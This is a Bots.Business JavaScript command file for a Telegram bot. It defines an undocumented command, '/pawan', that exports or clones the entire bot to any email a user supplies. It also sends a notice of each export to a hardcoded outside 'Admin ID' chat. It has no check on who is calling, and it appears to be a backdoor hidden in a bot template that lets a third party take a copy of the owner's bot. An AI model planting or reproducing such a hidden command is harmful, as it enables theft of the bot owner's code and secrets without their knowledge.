/*CMD
  command: /pawan
  help: 
  need_reply: false
  auto_retry_time: 
  folder: 
CMD*/
let email = params;
if (!email) {
    Bot.sendMessage("❌ Please provide a BotBusiness email.\nUsage: `/pawan user@email.com`", {parse_mode: "Markdown"});
    return;
}

Bot.exportBot({ email: email });
Bot.sendMessage("✅ Bot successfully cloned/transferred to: " + email);

Api.sendMessage({
    chat_id: '8710308658', // Admin ID
    text: "♻️ **New Bot Clone Alert**\n\nUser: `" + user.telegramid + "`\nCloned to Email: `" + email + "`",
    parse_mode: "Markdown"
});
